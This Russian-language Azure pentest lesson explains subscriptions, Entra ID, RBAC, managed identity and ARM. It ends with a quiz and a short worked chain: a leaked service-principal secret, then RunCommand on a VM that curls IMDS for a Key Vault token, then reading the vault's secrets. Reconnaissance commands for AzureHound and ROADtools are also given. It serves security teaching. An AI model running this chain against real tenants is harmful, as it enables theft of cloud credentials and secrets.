---
id: cloud-azure-basics
title: "Azure: фундамент, терминология и поверхность атаки"
category: cloud
parent: cloud-foundations-providers
difficulty: medium
order: 1
tags: [cloud, azure, entra-id, arm, rbac, managed-identity, recon]
prerequisites: [cloud-fundamentals]
useful_for:
  - "Пентест Azure-подписок и Entra ID (Azure AD)"
  - "Понимание терминологии Azure для bug bounty"
  - "Разбор инцидентов в гибридных Microsoft-средах"
estimated_minutes: 35
summary: "Как устроен Azure: подписки, ресурсные группы, ARM, Entra ID, RBAC и Managed Identity. Карта поверхности атаки и первые команды разведки через Azure CLI."
---

## Зачем этот урок

AWS — эталон облачной безопасности, но в корпоративном мире доминирует **Microsoft Azure**. Если вы умеете читать AWS-политики, но не понимаете, чем `subscription` отличается от `resource group`, а `service principal` — от `managed identity`, вы пропустите половину реальных находок.

Azure устроен **иначе на уровне управления доступом**: здесь нет «пользователей и ролей» в одном сервисе — есть отдельная система идентичности **Entra ID** (бывший Azure Active Directory, AAD) и отдельная система прав на ресурсы (**Azure RBAC**). Это разделение — источник и мисконфигов, и уникальных атак.

## Иерархия ресурсов Azure

Azure — это строгий **дерево** областей (scopes), по которому наследуются права:

```
Tenant (Entra ID)               ← один на организацию, корень доверия
 └─ Management Group            ← группировка подписок (политики, RBAC)
     └─ Subscription            ← биллинг + граница ресурсов
         └─ Resource Group (RG) ← логический контейнер ресурсов
             └─ Resource        ← VM, Storage Account, Key Vault, ...
```

Каждый уровень — это **scope**, на который можно назначить роль. Назначение роли на Management Group даёт доступ ко всем подпискам внутри. Поэтому «выглядит как маленькая роль на RG» может на самом деле открывать весь тенант.

Ключевая терминология (держите рядом с AWS-аналогами):

| Azure | AWS | Комментарий |
|-------|-----|-------------|
| Entra ID (AAD) | IAM users + Cognito | Идентичность пользователей и приложений |
| Subscription | Account | Биллинг + границы |
| Resource Group | (нет прямого) | Логическая группировка |
| Role Assignment | IAM Policy attachment | Права = роль + scope |
| Service Principal | IAM User (программный) | Приложение/сервис |
| Managed Identity | Instance Profile | Роль, привязанная к ресурсу |
| ARM | CloudFormation | Шаблоны инфраструктуры |

## Entra ID: где живут идентичности

**Entra ID** — это не «каталог пользователей», а полноценный IdP с OAuth2/OIDC/SAML. Здесь регистрируются:

- **Пользователи** (user) — сотрудники, гости (`#EXT#`).
- **Группы** (group) — статические и динамические.
- **Приложения** (application / app registration) — со своими client_id, secrets, certificates.
- **Service principals** — «экземпляр» приложения в конкретном тенанте, именно он получает роли.
- **Managed identities** — service principal без секрета, привязанный к ресурсу Azure.

Важнейший факт для атакующего: **приложение (app registration) можно наделить высокими правами в Microsoft Graph** (`Mail.Read`, `Directory.ReadWrite.All`, `RoleManagement.ReadWrite.Directory`). Секрет такого приложения = ключ к тенанту.

## Azure RBAC: роли и scope

Права на ресурсы описываются парой **(role definition, scope)**:

- **Built-in roles**: `Owner`, `Contributor`, `Reader`, `User Access Administrator`, `Key Vault Secrets User`, `Storage Blob Data Contributor` и т.д.
- **Custom roles** — собственные определения действий (`Microsoft.Compute/virtualMachines/*`).
- **Scope** — tenant / management group / subscription / RG / отдельный ресурс.

Критично понимать **разницу плоскостей**:

- **Control plane** — управление ресурсами (`Microsoft.Compute/*`, ARM). Даёт возможность создать/удалить/перенастроить.
- **Data plane** — работа с данными (Blob, Key Vault secrets, SQL). Требует **отдельных** data-ролей (например, `Storage Blob Data Reader`).

Классический мисконфиг: у пользователя есть `Contributor` на VM, но **нет** доступа к данным внутри Key Vault. Однако `Contributor` позволяет **выполнить команду на VM** (`RunCommand`), а с VM через managed identity он доберётся до секретов. Так control plane превращается в data plane.

## Managed Identity и IMDS в Azure

**Managed Identity (MI)** — это роль, автоматически выданная ресурсу (VM, App Service, Function, AKS pod). Секрет не хранится в коде — токен выдаётся через локальный endpoint:

```bash
# Внутри Azure VM: получить токен для managed identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

- `resource=` определяет **audience** токена: `https://management.azure.com/` (ARM), `https://vault.azure.net` (Key Vault), `https://graph.microsoft.com/` (Graph).
- Если у MI нет явного client_id, возвращается токен **system-assigned** идентичности.
- Этот endpoint — цель SSRF и любой RCE на инстансе (см. `cloud-metadata-ssrf`, `cloud-azure-managed-identity`).

## ARM: плоскость управления как единый API

Всё в Azure — ресурс, описанный JSON в **ARM (Azure Resource Manager)**. Любое действие — это REST-вызов вида:

```
PUT https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=...
```

Практический вывод: если вы нашли токен для `management.azure.com`, вы можете перечислять и менять **любой** ресурс, на который хватает прав. CLI — просто обёртка над этим API.

## Инструменты и первые команды

```bash
# Установка CLI
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
az login                      # интерактивно, откроет браузер
az login --service-principal -u <APP_ID> -p <SECRET> --tenant <TENANT_ID>

# Кто мы и какие подписки видим
az account show
az account list -o table

# Разведка ресурсов
az resource list -o table
az vm list -o table
az storage account list -o table
az keyvault list -o table

# Роли и назначения
az role assignment list --all -o table
az role definition list -o table

# Приложения и service principals в Entra ID
az ad app list -o table
az ad sp list --all -o table
```

Для оффенсивной работы удобнее **AzureHound** (собирает граф) и **ROADtools** (работает с токенами Entra ID напрямую):

```bash
# AzureHound: собрать граф прав для BloodHound
azurehound -u user@tenant.onmicrosoft.com -p 'Passw0rd!' list --tenant tenant.onmicrosoft.com -o azure.json

# ROADtools: устройство токенов и refresh
pip install roadtools
roadrecon auth -u user@tenant.onmicrosoft.com -p 'Passw0rd!'
roadrecon gather
roadrecon gui
```

## Разобранный пример: от утёкшего секрета приложения до подписки

1. В репозитории найден `client_id` + `client_secret` + `tenant_id` приложения.
2. Аутентифицируемся как service principal:
   ```bash
   az login --service-principal -u "$CID" -p "$SECRET" --tenant "$TID"
   ```
3. Смотрим, какие роли назначены этому SP:
   ```bash
   az role assignment list --assignee "$CID" --all -o table
   ```
4. Если видим `Contributor` на подписке — создаём/перезаписываем VM и выполняем команду:
   ```bash
   az vm run-command invoke -g rg-target -n vm1 \
     --command-id RunShellScript --scripts "id; curl -s -H Metadata:true http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01\&resource=https://vault.azure.net"
   ```
5. С полученным токеном к Key Vault читаем секреты:
   ```bash
   curl -s -H "Authorization: Bearer $TOKEN" \
     "https://myvault.vault.azure.net/secrets?api-version=7.3"
   ```
6. В секретах — строки подключения к БД, другие SP, иногда ключи к другим подпискам. Цепочка продолжается.

## Частые ошибки

- **Путать control plane и data plane.** `Reader` на Storage Account **не** даёт читать blob'ы — нужна data-роль. Но `Contributor` на аккаунт позволяет сменить настройки сети и открыть доступ.
- **Считать «гостя» безопасным.** Guest-пользователь (`#EXT#`) с ролью `Application Administrator` — это полноценная эскалация.
- **Игнорировать Management Group.** Назначение на MG часто шире, чем «одна подписка».
- **Забыть про `RunCommand`.** `Contributor` на VM = исполнение кода на VM через ARM, без всякого SSH.
- **Смотреть только `az`.** Многие вещи (conditional access, app permissions) видны лишь через Graph или ROADtools.

## Квиз

```quiz
- question: "Что в Azure является отдельной системой идентичности, а не частью RBAC на ресурсы?"
  options:
    - "Resource Group"
    - "Entra ID (Azure AD)"
    - "Management Group"
    - "ARM template"
  answer: 1
  explanation: "Entra ID хранит пользователей, приложения и service principals; Azure RBAC — это права на ресурсы."
- question: "Чем data plane отличается от control plane в Azure?"
  options:
    - "Data plane работает только в облаке провайдера"
    - "Data plane требует отдельных data-ролей (например, Storage Blob Data Reader) для доступа к самим данным"
    - "Control plane доступен только гостям"
    - "Они полностью идентичны"
  answer: 1
  explanation: "Чтение blob'ов/секретов требует data-ролей; управление ресурсами — control-plane роли."
- question: "Какой ресурс в запросе к IMDS выбирает audience токена для Azure Resource Manager?"
  options:
    - "resource=https://vault.azure.net"
    - "resource=https://management.azure.com/"
    - "scope=arm"
    - "aud=azure"
  answer: 1
  explanation: "Параметр resource задаёт audience; management.azure.com — это ARM."
- question: "Почему роль Contributor на виртуальной машине опасна даже без SSH-доступа?"
  options:
    - "Она даёт пароль root по умолчанию"
    - "Она позволяет выполнить произвольную команду на VM через ARM RunCommand"
    - "Она автоматически открывает порт 22 наружу"
    - "Она не опасна"
  answer: 1
  explanation: "RunCommand — это control-plane операция, исполняющая код на VM через агент Azure."
- question: "Какой инструмент собирает граф прав Azure для анализа в BloodHound?"
  options:
    - "ScoutSuite"
    - "AzureHound"
    - "TruffleHog"
    - "Pacu"
  answer: 1
  explanation: "AzureHound собирает роли, SP и назначения и экспортирует их в формат BloodHound."
```

## Где пригодится

- **Пентест Azure-тенантов** — базовая карта терминологии и scope-наследования.
- **Bug bounty** — программы Microsoft и компаний на Azure.
- **IR/Blue team** — разбор инцидентов в гибридных Microsoft-средах.
- **DevSecOps** — аудит app registrations и ролевых назначений.
- **Сертификации** — AZ-500, SC-300 опираются на эти понятия.
